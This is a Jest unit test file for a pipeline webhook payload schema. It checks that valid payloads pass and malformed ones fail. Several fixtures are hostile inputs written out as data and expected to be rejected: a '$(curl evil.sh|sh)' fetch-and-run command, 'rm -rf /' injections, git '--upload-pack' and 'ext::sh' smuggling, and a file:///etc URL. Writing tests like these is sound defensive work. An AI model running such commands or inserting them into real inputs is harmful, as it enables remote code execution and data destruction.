/**
 * Unit tests for the pipeline webhook payload schema validation.
 *
 * These tests use the exported Zod schema directly — no HTTP server, DB, or Redis
 * required. They verify that the API correctly accepts valid payloads and
 * rejects malformed ones before any business logic runs.
 */

import { PipelinePayloadSchema } from '../webhooks/pipeline';

// pipeline.ts imports DB/Redis/WebSocket modules — stub them so no connections are opened
jest.mock('../services/serviceService', () => ({}));
jest.mock('../services/deploymentService', () => ({}));
jest.mock('../db/redis', () => ({ scanQueue: { add: jest.fn() } }));
jest.mock('../websocket/index', () => ({ wsEvents: {} }));

describe('Pipeline Webhook — Payload Schema Validation', () => {
  const validPayload = {
    commit_sha: 'abc1234def56789',
    service_name: 'devlens-backend',
    branch: 'main',
    author: 'yuvrajgohil24',
    environment: 'staging',
    pipeline_url: 'https://github.com/yuvrajgohil24/DevLens/actions/runs/1234',
  };

  it('should accept a fully valid payload', () => {
    const result = PipelinePayloadSchema.safeParse(validPayload);
    expect(result.success).toBe(true);
  });

  it('should apply default values when optional fields are omitted', () => {
    const minimalPayload = {
      commit_sha: 'abc1234def56789',
      service_name: 'devlens-backend',
    };
    const result = PipelinePayloadSchema.safeParse(minimalPayload);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.branch).toBe('main');
      expect(result.data.author).toBe('unknown');
      expect(result.data.status).toBe('running');
      expect(result.data.environment).toBe('staging');
    }
  });

  it('should reject a payload with a commit_sha that is too short (< 7 chars)', () => {
    const result = PipelinePayloadSchema.safeParse({
      ...validPayload,
      commit_sha: 'abc12', // only 5 chars
    });
    expect(result.success).toBe(false);
  });

  it('should reject a payload missing the required service_name', () => {
    const { service_name: _, ...withoutServiceName } = validPayload;
    const result = PipelinePayloadSchema.safeParse(withoutServiceName);
    expect(result.success).toBe(false);
  });

  it('should reject an invalid environment value', () => {
    const result = PipelinePayloadSchema.safeParse({
      ...validPayload,
      environment: 'development', // not in enum
    });
    expect(result.success).toBe(false);
  });

  it('should reject a malformed pipeline_url', () => {
    const result = PipelinePayloadSchema.safeParse({
      ...validPayload,
      pipeline_url: 'not-a-valid-url',
    });
    expect(result.success).toBe(false);
  });

  it('should accept production as a valid environment', () => {
    const result = PipelinePayloadSchema.safeParse({
      ...validPayload,
      environment: 'production',
    });
    expect(result.success).toBe(true);
  });

  it('should reject a commit_sha containing shell syntax', () => {
    const result = PipelinePayloadSchema.safeParse({
      ...validPayload,
      commit_sha: '$(curl evil.sh|sh)',
    });
    expect(result.success).toBe(false);
  });

  it('should reject branch names with shell syntax or a leading dash', () => {
    for (const branch of ['main; rm -rf /', '--upload-pack=touch /tmp/x', 'a..b', '$(id)']) {
      expect(PipelinePayloadSchema.safeParse({ ...validPayload, branch }).success).toBe(false);
    }
  });

  it('should accept common branch names', () => {
    for (const branch of ['main', 'feat/guest-demo-mode', 'release-1.2.3', 'deploy_testing']) {
      expect(PipelinePayloadSchema.safeParse({ ...validPayload, branch }).success).toBe(true);
    }
  });

  it('should only accept plain https GitHub repo URLs', () => {
    const ok = ['https://github.com/yuvrajgohil24/DevLens', 'https://github.com/yuvrajgohil24/DevLens.git'];
    const bad = [
      'https://github.com/a/b; rm -rf /',
      'file:///etc',
      'https://evil.com/a/b',
      'https://github.com/a/b/../../c',
      'ext::sh -c touch% /tmp/pwned',
    ];
    for (const repo_url of ok) {
      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url }).success).toBe(true);
    }
    for (const repo_url of bad) {
      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url }).success).toBe(false);
    }
  });

  it('should reject repo URLs from a different owner when GITHUB_OWNER is set', () => {
    const previous = process.env.GITHUB_OWNER;
    process.env.GITHUB_OWNER = 'yuvrajgohil24';
    try {
      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url: 'https://github.com/YuvrajGohil24/DevLens' }).success).toBe(true);
      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url: 'https://github.com/someone-else/repo' }).success).toBe(false);
    } finally {
      if (previous === undefined) delete process.env.GITHUB_OWNER;
      else process.env.GITHUB_OWNER = previous;
    }
  });
});
